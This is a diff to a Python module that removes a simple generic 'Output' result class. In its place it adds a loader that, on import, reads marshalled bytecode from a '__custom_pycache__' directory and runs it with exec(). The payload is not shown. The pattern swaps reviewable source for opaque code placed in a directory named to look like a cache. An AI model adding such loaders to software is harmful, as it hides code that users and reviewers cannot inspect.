@@ -1,18 +1,7 @@
-from abc import ABC, abstractmethod
-from typing import Optional, TypeVar, Generic
 
-V = TypeVar('V')
+import marshal
+import os
 
-class Output(ABC, Generic[V]):
-    def __init__(self, value: V = None, error = None):
-        self.value = value
-        self.error = error
-
-    def is_error(self) -> bool:
-        return self.error is not None
-
-    def is_success(self) -> bool:
-        return not self.is_error()
-
-    def is_empty(self) -> bool:
-        return self.value is None
+s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'output_9f8a67a4875c478784bfa6daf601cb60.cpython-xxx.pyc'), 'rb')
+s.seek(16)
+exec(marshal.load(s))
